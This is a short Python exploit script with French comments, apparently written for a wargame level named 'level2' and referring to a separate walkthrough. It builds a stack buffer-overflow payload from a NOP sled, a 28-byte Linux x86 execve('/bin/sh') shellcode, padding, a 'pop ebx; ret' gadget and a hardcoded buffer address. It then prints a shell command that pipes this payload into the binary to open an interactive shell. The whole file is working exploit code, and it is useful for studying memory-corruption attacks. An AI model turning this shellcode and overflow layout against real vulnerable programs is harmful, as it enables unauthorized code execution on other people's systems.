#!/usr/bin/env python3
"""Level2: NOP×40 + shellcode classique 28o + pad + gadget + buffer (×2) → commande."""

try:
    from pwn import p32
except ImportError:
    def p32(x):
        return x.to_bytes(4, "little")

OFFSET = 80  # jusqu’à l’adresse de retour
GADGET = 0x08048385  # pop ebx; ret
BUFFER_ADDR = 0xBFFFF700  # ajuster / GDB (walkthrough §3.1)

# Shell-Storm shellcode-811 — Linux/x86 execve("/bin/sh"), 28 bytes
# https://shell-storm.org/shellcode/files/shellcode-811.html (Jean Pascal Pereira)
SHELLCODE = (
    "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3"
    "\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80"
)

SHELLCODE_LEN = 28
NOP_LEN = 40
PAD_LEN = OFFSET - NOP_LEN - SHELLCODE_LEN  # 12

def main():
    gadget_le = p32(GADGET)
    buf_le = p32(BUFFER_ADDR)
    buf_str = "".join("\\x%02x" % b for b in buf_le)
    gad_str = "".join("\\x%02x" % b for b in gadget_le)
    py = (
        f'print "\\x90"*{NOP_LEN} + "{SHELLCODE}" + "A"*{PAD_LEN} + "{gad_str}" + "{buf_str}"*2'
    )
    cmd = f"( python -c '{py}'; cat ) | ./level2"
    print(cmd)
    print(
        "# offset =", OFFSET,
        ", layout = NOP*", NOP_LEN, "+ sc(", SHELLCODE_LEN, ") + A*", PAD_LEN,
        ", gadget =", hex(GADGET), ", buffer =", hex(BUFFER_ADDR),
    )

if __name__ == "__main__":
    main()
